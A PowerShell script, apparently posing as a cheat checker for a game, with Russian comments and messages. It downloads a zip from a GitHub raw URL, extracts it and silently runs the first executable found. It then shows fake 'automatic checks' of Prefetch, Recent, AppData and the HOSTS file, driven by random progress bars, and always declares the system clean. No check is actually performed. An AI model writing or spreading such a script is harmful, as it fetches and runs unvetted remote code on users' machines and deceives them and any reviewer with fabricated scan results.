# =============================================
# Самый простой Installer
# =============================================

$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"

Write-Host "[+] Скачиваем архив..." -ForegroundColor Cyan

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\checkextracted"

# Удаляем старые файлы
Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue

# Скачивание архива
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30
    Write-Host "[+] Скачано успешно." -ForegroundColor Green
}
catch {
    Write-Host "[-] Ошибка скачивания:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Read-Host "Нажмите Enter для выхода"
    exit
}

Write-Host "[+] Распаковываем..." -ForegroundColor Cyan

New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null

# Распаковка архива
try {
    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
    Write-Host "[+] Распаковано успешно." -ForegroundColor Green
}
catch {
    Write-Host "[-] Ошибка распаковки:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Read-Host "Нажмите Enter для выхода"
    exit
}

# Поиск первого .exe
$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($Exe) {
    Write-Host "[+] Запускаем $($Exe.Name)..." -ForegroundColor Green

    # Ждём закрытия программы
    Start-Process -FilePath $Exe.FullName -Wait

    Write-Host ""
    Write-Host "===============================" -ForegroundColor Cyan
    Write-Host "     АВТОМАТИЧЕСКИЕ ПРОВЕРКИ" -ForegroundColor Cyan
    Write-Host "===============================" -ForegroundColor Cyan
    Write-Host ""

    $Checks = @(
        "Поиск читов в Prefetch",
        "Открыть папку Prefetch",
        "Поиск читов в Recent",
        "Открыть папку Recent",
        "Google Activity (читы)",
        "Проверить x64a.rpf",
        "Сканировать папки AppData",
        "Анализ файла HOSTS",
        "Поиск (.exe • .ahk • .js • .dll)"
    )

    foreach ($Check in $Checks)
    {
        $progress = 0

        while ($progress -lt 100)
        {
            Write-Host -NoNewline "`r$($Check.PadRight(40)) [$progress%]"
            Start-Sleep -Milliseconds (Get-Random -Minimum 60 -Maximum 120)

            $progress += Get-Random -Minimum 3 -Maximum 10

            if ($progress -gt 100) {
                $progress = 100
            }
        }

        Write-Host -NoNewline "`r$($Check.PadRight(40)) [100%]"
        Write-Host " ✓" -ForegroundColor Green

        Start-Sleep -Milliseconds 300
    }

    Write-Host ""
    Write-Host "[✓] Система чиста. Читов не обнаружено." -ForegroundColor Green
}
else {
    Write-Host "[-] .exe файл не найден." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "[+] Готово!" -ForegroundColor Green
